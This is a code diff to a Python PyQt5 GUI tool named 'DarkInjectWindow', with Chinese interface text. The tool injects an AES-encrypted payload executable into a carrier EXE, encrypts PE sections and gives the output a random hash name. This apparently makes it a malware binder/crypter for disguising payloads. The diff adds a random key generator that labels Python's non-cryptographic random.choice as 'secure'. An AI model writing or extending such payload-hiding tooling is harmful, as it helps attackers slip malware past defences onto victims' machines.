@@ -18,14 +18,14 @@ from PyQt5.QtGui import *
 
 
 def safe_move(src, dst):
-
+  
     src_abs = os.path.abspath(src)
     dst_abs = os.path.abspath(dst)
     if src_abs == dst_abs:
         return dst_abs
     if os.path.exists(dst_abs):
         os.remove(dst_abs)
-
+   
     if os.path.splitdrive(src_abs)[0] != os.path.splitdrive(dst_abs)[0]:
         shutil.copy2(src_abs, dst_abs)
         os.remove(src_abs)
@@ -34,7 +34,7 @@ def safe_move(src, dst):
     return dst_abs
 
 def get_sha256(file_path):
-
+  
     h = hashlib.sha256()
     if not os.path.isfile(file_path):
         return ""
@@ -44,7 +44,7 @@ def get_sha256(file_path):
     return h.hexdigest()
 
 def get_md5(file_path):
-
+  
     h = hashlib.md5()
     if not os.path.isfile(file_path):
         return ""
@@ -54,11 +54,11 @@ def get_md5(file_path):
     return h.hexdigest()
 
 def derive_aes_key(raw_key: str) -> bytes:
-   
+  
     return hashlib.sha256(raw_key.encode("utf-8")).digest()
 
 def aes_cbc_encrypt(data: bytes, raw_key: str) -> tuple[bytes, bytes]:
-   
+    
     key = derive_aes_key(raw_key)
     iv = os.urandom(16)
     padder = padding.PKCS7(128).padder()
@@ -69,7 +69,7 @@ def aes_cbc_encrypt(data: bytes, raw_key: str) -> tuple[bytes, bytes]:
     return iv, cipher_data
 
 def aes_cbc_decrypt(iv: bytes, cipher_data: bytes, raw_key: str) -> bytes:
-   
+
     key = derive_aes_key(raw_key)
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
     decryptor = cipher.decryptor()
@@ -116,19 +116,19 @@ def check_file_integrity(exe):
 
 
 def get_icon_data(pe):
- 
+    
     try:
         if not hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
             return None
-   
+        
         for res_root in pe.DIRECTORY_ENTRY_RESOURCE.entries:
-            
+         
             if res_root.id == pefile.RESOURCE_TYPE['RT_ICON']:
                 for lang_entry in res_root.directory.entries:
                     if not lang_entry.directory.entries:
                         continue
                     entry = lang_entry.directory.entries[0]
-               
+                   
                     raw_data = entry.data.struct.get_data(pe)
                     return type('IconObj', (), {'data': raw_data})
         return None
@@ -140,8 +140,14 @@ def generate_md5_filename(file_path: str):
     return hashlib.md5(rand_seed.encode()).hexdigest() + ".exe"
 
 
+def random_secure_key(length: int) -> str:
+    
+    char_pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+    return ''.join(random.choice(char_pool) for _ in range(length))
+
+
 def encrypt_pe_data_section(pe_path: str, save_path: str, key: str):
- 
+    
     shutil.copy2(pe_path, save_path)
     pe = pefile.PE(save_path)
     iv_global = os.urandom(16)
@@ -154,9 +160,9 @@ def encrypt_pe_data_section(pe_path: str, save_path: str, key: str):
                 size = sec.SizeOfRawData
                 fw.seek(ptr)
                 sec_data = fw.read(size)
-              
+                
                 iv, enc_sec = aes_cbc_encrypt(sec_data, key)
-               
+                
                 fw.seek(ptr)
                 fw.write(enc_sec[:size])
     pe.close()
@@ -165,7 +171,7 @@ def encrypt_pe_data_section(pe_path: str, save_path: str, key: str):
 def inject_exe(target, payload, out, key):
     try:
         if not check_file_integrity(target) or not check_file_integrity(payload):
-            return False, 
+            return False,
 
         t_pe = pefile.PE(target)
         p_pe = pefile.PE(payload)
@@ -175,7 +181,7 @@ def inject_exe(target, payload, out, key):
         with open(payload, 'rb') as f:
             p_data = f.read()
 
-        # AES-CBC加密载荷
+      
         iv, enc_payload = aes_cbc_encrypt(p_data, key)
         combine_enc = iv + enc_payload
         b64_enc = base64.b64encode(combine_enc)
@@ -221,6 +227,7 @@ class DarkInjectWindow(QMainWindow):
             QTextEdit {background-color: #1e1e20; border: 1px solid #38383d; border-radius: 6px; padding: 8px; font-family: Consolas, monospace; font-size: 9pt;}
             QLabel {color: #dddddd;}
             QFrame[frameShape="4"] {color: #3a3a3f; height: 1px;}
+            QRadioButton {color:#ddd;}
         """)
 
         central_widget = QWidget()
@@ -272,14 +279,32 @@ class DarkInjectWindow(QMainWindow):
         file_layout.addLayout(row_output)
         main_layout.addWidget(file_group)
 
+        
         key_group = QGroupBox("AES加密密钥设置")
         key_layout = QVBoxLayout(key_group)
         key_layout.setContentsMargins(16, 22, 16, 16)
         key_layout.setSpacing(10)
+
+        
+        radio_layout = QHBoxLayout()
+        self.radio_16 = QRadioButton("16位随机密钥")
+        self.radio_32 = QRadioButton("32位随机密钥")
+        self.radio_32.setChecked(True) # 默认32位
+        radio_layout.addWidget(self.radio_16)
+        radio_layout.addWidget(self.radio_32)
+        radio_layout.addStretch()
+        key_layout.addLayout(radio_layout)
+
+        
+        key_input_layout = QHBoxLayout()
         self.key_input = QLineEdit()
-        self.key_input.setPlaceholderText("自定义加密密钥（任意字符串，越长安全性越高）")
-        key_layout.addWidget(QLabel("加密密钥："))
-        key_layout.addWidget(self.key_input)
+        self.key_input.setPlaceholderText("自定义加密密钥（或点击右侧随机生成）")
+        btn_gen_key = QPushButton("随机生成密钥")
+        btn_gen_key.clicked.connect(self.generate_random_key)
+        key_input_layout.addWidget(self.key_input, stretch=1)
+        key_input_layout.addWidget(btn_gen_key, stretch=0)
+        key_layout.addLayout(key_input_layout)
+
         main_layout.addWidget(key_group)
 
         btn_layout = QHBoxLayout()
@@ -299,6 +324,13 @@ class DarkInjectWindow(QMainWindow):
         self.log_text.setReadOnly(True)
         log_layout.addWidget(self.log_text)
         main_layout.addWidget(log_group)
+
+   
+    def generate_random_key(self):
+        length = 32 if self.radio_32.isChecked() else 16
+        new_key = random_secure_key(length)
+        self.key_input.setText(new_key)
+        self.log_print(f"[生成密钥] 已生成{length}位随机密钥", color="#9cf0ff")
 
     def select_target_file(self):
         path, _ = QFileDialog.getOpenFileName(self, "选择载体EXE", "", "可执行文件 (*.exe)")
@@ -339,7 +371,7 @@ class DarkInjectWindow(QMainWindow):
             self.log_print("[-] 错误：请设置输出保存路径", color="#ff6b6b")
             return
         if not key:
-            self.log_print("[-] 错误：请输入AES加密密钥", color="#ff6b6b")
+            self.log_print("[-] 错误：请输入AES加密密钥，可点击随机生成", color="#ff6b6b")
             return
 
         self.log_print("=" * 60, color="#888888")
@@ -355,7 +387,7 @@ class DarkInjectWindow(QMainWindow):
 
         ok, msg = inject_exe(target, payload, temp_out, key)
         if ok:
-          
+            
             final_name = hashlib.md5(os.urandom(16)).hexdigest() + ".exe"
             final_full_path = safe_move(temp_out, final_name)
             md5_hash = get_md5(final_full_path)
